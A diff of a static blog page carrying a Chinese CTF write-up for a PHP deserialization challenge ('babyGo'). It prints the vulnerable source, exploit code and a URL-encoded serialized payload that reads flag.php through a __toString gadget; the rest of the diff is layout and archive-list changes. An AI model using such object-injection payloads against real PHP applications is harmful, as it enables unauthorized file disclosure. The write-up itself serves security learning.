@@ -402,18 +402,25 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <h1 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb) &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file)) &#123;             </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>])) &#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>一个简单的反序列化题。<br>注意到一个魔术方法 <code>__toString()</code>，当 <code>echo $obj;</code> 时会自动调用。<br>第三行的 <code>include &#39;flag.php&#39;;</code> 想必 flag 就在这个文件里了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line"><span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb) &#123;</span><br></pre></td></tr></table></figure></p>
+
+<p>一个简单的反序列化题。<br>注意到一个魔术方法 <code>__toString()</code>，当 <code>echo $obj;</code> 时会自动调用。<br>第三行的 <code>include &#39;flag.php&#39;;</code> 想必 flag 就在这个文件里了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line"><span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb) &#123;</span><br></pre></td></tr></table></figure>
+
 <p>只要满足这个 <code>if</code> 就能读到 <code>flag.php</code></p>
 <p>这里有两个思路，</p>
 <ul>
-<li>让 <code>amzing</code> 直接为空，反序列化后<code>nice</code>依然为空，<br>得到的 <code>$this-&gt;nice-&gt;aaa</code>和 <code>$this-&gt;nice-&gt;bbb</code>自然全为 null，所以 <code>===</code>。</li>
+<li><p>让 <code>amzing</code> 直接为空，反序列化后<code>nice</code>依然为空，<br>得到的 <code>$this-&gt;nice-&gt;aaa</code>和 <code>$this-&gt;nice-&gt;bbb</code>自然全为 null，所以 <code>===</code>。</p>
+</li>
 <li><p>让<code>this-&gt;bbb = &amp;this-&gt;aaa</code>，随便 <code>aaa</code> 怎么变。<br>此处的 <code>exp</code> 为：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cc = <span class="keyword">new</span> baby();</span><br><span class="line">$cc-&gt;bbb = &amp;$cc-&gt;aaa;</span><br><span class="line">print_r(urlencode(serialize($cc)));</span><br><span class="line"><span class="comment">/* O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A3%3A%22s</span></span><br><span class="line"><span class="comment">ec%22%3A0%3A%7B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A3%3B%7D */</span></span><br></pre></td></tr></table></figure>
+
 <p><strong>exp</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  <span class="comment">// cool 对象</span></span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;skyobj = new sec;</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj-&gt;filename = <span class="string">'flag.php'</span>;</span><br><span class="line">        <span class="comment">//$this-&gt;skyobj-&gt;amzing = 'O%3A4%3A%22baby%22%3A3%3A.........';</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$bb = <span class="keyword">new</span> baby();</span><br><span class="line">print_r(urlencode(serialize($bb)));</span><br></pre></td></tr></table></figure>
+
 </li>
 </ul>
-<p>url 编码是必要的，避免特殊符号编码引起的长度歧义，出现 <code>Error at offset 错误</code>。<br>flag 在源代码里，记得查看。</p>
+<p>url 编码是必要的，避免特殊符号编码引起的长度歧义，出现 <code>Error at offset 错误</code>。
+flag 在源代码里，记得查看。</p>
 <h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple php"></a>simple php</h1><p>待更新</p>
 
     </article>
@@ -981,9 +988,57 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 30
+        Total : 34
         </div>
         <!-- search  -->
         
@@ -996,6 +1051,26 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/SSRF-Tips/">SSRF Tips</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/phar-与反序列化/">phar 与反序列化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/17</span><a class="archive-post-title" href="/2019/05/17/Redis-未授权访问相关利用/">Redis 未授权访问相关利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href="/2019/05/12/命令注入绕过总结/">命令注入总结</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1163,23 +1238,29 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
-        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="总结"><span class="iconfont-archer">&#xe606;</span>总结</span>
     
         <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
